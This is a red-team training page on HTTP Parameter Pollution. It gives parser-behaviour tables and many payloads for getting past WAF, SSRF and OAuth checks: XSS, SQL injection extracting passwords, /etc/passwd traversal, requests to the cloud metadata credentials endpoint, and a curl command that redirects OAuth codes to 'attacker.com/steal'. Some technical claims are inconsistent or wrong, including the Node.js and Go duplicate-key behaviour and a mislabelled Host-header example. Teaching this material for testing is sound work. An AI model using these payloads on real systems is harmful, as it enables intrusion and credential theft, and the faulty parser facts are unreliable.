---
layout: training-page
title: "HTTP Parameter Pollution — Red Team Academy"
module: "Web Hacking"
tags:
  - hpp
  - parameter-pollution
  - web
  - evasion
page_key: "web-http-parameter-pollution"
render_with_liquid: false
---

# HTTP Parameter Pollution

HTTP Parameter Pollution (HPP) is a web attack and evasion technique that exploits how different web technologies handle duplicate HTTP parameters. By supplying the same parameter name multiple times in a request, an attacker can manipulate application logic or bypass security controls, because the server-side technology may read the first, last, or all values depending on the framework.

## How HPP Works

There is no formal specification for how servers must parse duplicate parameters. Each technology makes its own decision: take the first occurrence, take the last, or concatenate all values. This inconsistency is the root of HPP attacks.

HPP targets two levels:

- **Client-Side HPP**: Exploits JavaScript running in the browser that constructs URLs from query parameters.
- **Server-Side HPP**: Exploits server logic that processes duplicate parameters in unexpected ways.

## Parameter Parsing Behavior by Technology

When the query string is `?par1=a&par1=b`, each technology returns a different value for `par1`:

| Technology | Parsing Result | Value of par1 |
| --- | --- | --- |
| ASP.NET / IIS | All occurrences | a,b |
| ASP / IIS | All occurrences | a,b |
| Golang net/http — r.URL.Query().Get() | First occurrence | a |
| Golang net/http — r.URL.Query()[] | All occurrences (array) | ['a','b'] |
| IBM HTTP Server | First occurrence | a |
| IBM Lotus Domino | First occurrence | a |
| JSP / Servlet / Tomcat | First occurrence | a |
| mod_wsgi (Python) / Apache | First occurrence | a |
| Node.js | All occurrences | a,b |
| Perl CGI / Apache | First occurrence | a |
| PHP / Apache | Last occurrence | b |
| PHP / Zeus | Last occurrence | b |
| Python Django | Last occurrence | b |
| Python Flask | First occurrence | a |
| Python / Zope | All occurrences (array) | ['a','b'] |
| Ruby on Rails | Last occurrence | b |

## Attack Scenarios

Classic examples where duplicate parameters change application behavior:

```
# Debug flag bypass — server reads last value (true)
/app?debug=false&debug=true

# Amount manipulation — WAF validates first value, backend uses last
/transfer?amount=1&amount=5000
```

## HPP Payloads

### Duplicate Parameters

```
param=value1&param=value2
```

### Array Injection

PHP and some other frameworks support bracket notation for arrays:

```
param[]=value1
param[]=value1&param[]=value2
param[]=value1&param=value2
param=value1&param[]=value2
```

### Encoded Parameter Injection

URL-encode the ampersand to inject a second parameter value within a single parameter:

```
param=value1%26other=value2
```

### Nested Injection

```
param[key1]=value1&param[key2]=value2
```

### JSON Duplicate Keys

Some JSON parsers accept duplicate keys and take the last value; others take the first:

```
{
    "role": "user",
    "role": "admin"
}
```

## Testing with Burp Suite

The most practical approach is to intercept requests in Burp Suite and manually duplicate parameters in the raw request editor. Send to Repeater and compare responses when placing the second copy before or after the original.

```
# Original request
POST /api/transfer HTTP/1.1
Content-Type: application/x-www-form-urlencoded

amount=100&to_account=victim

# HPP attempt — inject a second amount
POST /api/transfer HTTP/1.1
Content-Type: application/x-www-form-urlencoded

amount=100&to_account=victim&amount=99999
```

## WAF Bypass via HPP

A WAF may inspect only the first occurrence of a parameter. If the backend reads the last occurrence, a malicious payload in the second instance bypasses the WAF:

```
# WAF inspects first value (clean), backend uses second (malicious)
GET /search?q=hello&q=<script>alert(1)</script>
```

## Tools

- **Burp Suite** — Manually modify requests to test duplicate parameters in Repeater or Intruder.
- **OWASP ZAP** — Intercept and manipulate HTTP parameters.

---

## Backend Behavior Deep-Dive

Understanding exactly how each backend resolves duplicates allows precise targeting of the inconsistency.

### PHP (Last Wins)

PHP's `$_GET`, `$_POST`, and `$_REQUEST` superglobals store only one value per key — the last one:

```php
// Query string: ?a=first&a=second
echo $_GET['a'];  // Outputs: second
```

This means: if a WAF or input filter checks `$_GET['a']` and gets "first" (clean), but the application reads `$_GET['a']` after the filter and gets "second" (malicious), the filter is bypassed.

However, PHP respects the last value consistently — there is no split behavior within PHP itself. The attack targets a split between PHP and a non-PHP security layer.

### ASP.NET (Comma-Joined)

ASP.NET joins all values with a comma:

```
// Query string: ?a=first&a=second
Request.QueryString["a"] // Returns: "first,second"
```

This enables injection attacks where a security check splits on commas and validates each token, but the application uses the full joined string. Inject a comma within the value to manipulate the join:

```
GET /api?role=user,admin
# Equivalent to: role=user&role=admin for ASP.NET
```

### Node.js (Array / Last)

Express with `qs` (default) returns an array for bracket notation and the last value for plain duplicates:

```javascript
// Query: ?a=first&a=second
req.query.a  // "second" (last wins with qs default settings)

// Query: ?a[]=first&a[]=second
req.query.a  // ["first", "second"] (array)
```

### Flask (First Wins)

```python
# Query: ?a=first&a=second
request.args.get('a')  # Returns: "first"
request.args.getlist('a')  # Returns: ["first", "second"]
```

### Django (Last Wins for .get(), All for .getlist())

```python
# Query: ?a=first&a=second
request.GET.get('a')     # Returns: "second"
request.GET.getlist('a') # Returns: ["first", "second"]
```

---

## HPP to Bypass WAF / Security Controls

### Scenario: XSS Filter Bypass

A WAF inspects the first occurrence of the `search` parameter and blocks XSS payloads. The backend uses the last value:

```
GET /search?q=innocent&q=<script>alert(1)</script>
```

WAF sees: `q=innocent` → clean, allowed.
Backend (PHP/Rails): reads last `q` → `<script>alert(1)</script>` → XSS executes.

### Scenario: SQL Injection Filter Bypass

```
GET /user?id=1&id=1 OR 1=1--
```

WAF validates first `id=1` (clean integer), backend (PHP) processes last `id=1 OR 1=1--` → SQLi.

### Scenario: Path Traversal Bypass

```
GET /download?file=report.pdf&file=../../etc/passwd
```

WAF whitelist-checks first parameter value, backend reads last.

---

## HPP for SSRF Filter Bypass

Applications that make server-side HTTP requests based on a `url=` parameter often apply SSRF filters. HPP can bypass these when the filter and the HTTP client read different values:

```
# Filter validates first url parameter (legitimate domain)
# HTTP client uses last url parameter (internal address)
POST /api/fetch
Content-Type: application/x-www-form-urlencoded

url=https://legitimate.com&url=http://169.254.169.254/latest/meta-data/
```

This is effective when:
- The security layer reads `url` first (gets [https://legitimate.com](https://legitimate.com), passes the check)
- The downstream HTTP client reads `url` last (gets `http://169.254.169.254/...`, makes the request)

SSRF via duplicate Host header (HTTP Request Smuggling adjacent):

```
GET /fetch?endpoint=external.com&endpoint=internal.corp.network HTTP/1.1
```

---

## HPP in OAuth Flows

OAuth 2.0 flows pass several parameters in query strings. HPP can manipulate `state`, `redirect_uri`, `scope`, and `response_type`:

### State Parameter Manipulation

The `state` parameter is a CSRF protection nonce. If an authorization server joins duplicate state values and the client validates only part of the joined value:

```
# Original OAuth request
GET /oauth/authorize?response_type=code&client_id=app&state=NONCE&redirect_uri=https://app.com/callback

# HPP attack — inject second state value
GET /oauth/authorize?response_type=code&client_id=app&state=NONCE&state=ATTACKER_STATE&redirect_uri=https://app.com/callback
```

If the server joins them as `NONCE,ATTACKER_STATE` and passes both in the redirect, the client may not properly validate.

### redirect_uri HPP

```
GET /oauth/authorize?client_id=app&redirect_uri=https://app.com/callback&redirect_uri=https://attacker.com/steal
```

If the authorization server validates the first `redirect_uri` against the allowlist but redirects to the last, the authorization code goes to the attacker.

### scope Expansion

```
GET /oauth/authorize?scope=read&scope=write&scope=admin
```

If the server grants the union of all scope values, this bypasses a request for minimal scopes.

---

## HPP in REST APIs

REST APIs that accept both query string parameters and JSON body may have inconsistent behavior when the same field appears in both:

```
POST /api/transfer?amount=1 HTTP/1.1
Content-Type: application/json

{"amount": 99999}
```

If the backend merges query string and body parameters, or if a WAF inspects the query string while the application reads the body, the discrepancy enables bypass.

### JSON Duplicate Key HPP

Different JSON libraries handle duplicate keys differently:

```json
{"admin": false, "admin": true}
```

| Library | Behavior |
| --- | --- |
| Python json.loads() | Last value (admin=true) |
| Java Jackson | Last value |
| PHP json_decode() | Last value |
| Go encoding/json | First value |
| JavaScript JSON.parse() | Last value |

---

## Testing Methodology

### Manual Burp Approach

1. Intercept the target request in Burp Proxy.
2. Send to Repeater (Ctrl+R).
3. In the Raw tab, add a duplicate parameter after the original:
   ```
   POST /api/login HTTP/1.1
   Content-Type: application/x-www-form-urlencoded

   username=admin&password=test&username=attacker
   ```
4. Observe the response — does the application authenticate as `admin` or `attacker`?
5. Try reversing the order: `username=attacker&password=test&username=admin`
6. Try with URL-encoded `%26` to inject within a single parameter value.

### Automation with ffuf

```bash
# Test duplicate parameter behavior
ffuf -u "https://target.com/search?q=test&q=FUZZ" \
  -w payloads.txt \
  -mc 200 \
  -fr "no results"
```

### Testing OAuth redirect_uri HPP

```bash
# Test if second redirect_uri overrides the first
curl -v "https://target.com/oauth/authorize?client_id=CLIENT_ID\
&redirect_uri=https://target.com/callback\
&redirect_uri=https://attacker.com/steal\
&response_type=code\
&state=test123"

# Check the Location header in the response
# If it redirects to attacker.com — vulnerable
```

---

## Full Payload Examples for Each Bypass Scenario

### WAF XSS Bypass

```
# PHP backend (reads last), WAF reads first
GET /page?input=clean&input=<script>alert(origin)</script>

# Encoded second parameter
GET /page?input=clean&input=%3Cscript%3Ealert(origin)%3C/script%3E
```

### SQL Injection Bypass

```
# PHP: last value wins
GET /user?id=1&id=1 UNION SELECT username,password FROM users--
GET /item?category=books&category=books' OR 1=1--
```

### SSRF Bypass

```
POST /api/webhook
Content-Type: application/x-www-form-urlencoded

url=https://external.com&url=http://169.254.169.254/latest/meta-data/iam/security-credentials/
```

### Authentication Bypass

```
# If WAF checks first value but backend uses last
POST /login
Content-Type: application/x-www-form-urlencoded

username=legit_user&password=wrongpassword&username=admin
```

### Rate Limit Bypass via Parameter Manipulation

```
# Some rate limit implementations key on a specific parameter
# Sending different "user" values may create separate rate limit buckets
POST /api/verify-otp
otp=123456&user=victim@company.com&user=another@company.com
```

---

## Resources

- How to Detect HTTP Parameter Pollution Attacks — Acunetix — `acunetix.com/blog/whitepaper-http-parameter-pollution/`
- HTTP Parameter Pollution — Itamar Verta, Imperva — `imperva.com/learn/application-security/http-parameter-pollution/`
- HTTP Parameter Pollution in 11 minutes — PwnFunction — `youtube.com/watch?v=QVZBl8yxVX0`
- HTTP Parameter Pollution — OWASP Testing Guide — `owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/07-Input_Validation_Testing/04-Testing_for_HTTP_Parameter_Pollution`
- Luca Carettoni & Stefano di Paola — HTTP Parameter Pollution (OWASP AppSec EU 2009) — `owasp.org/www-pdf-archive/AppsecEU09_CarettoniDiPaola_v0.8.pdf`
- HPP + OAuth Attacks — `portswigger.net/research/oauth-2`
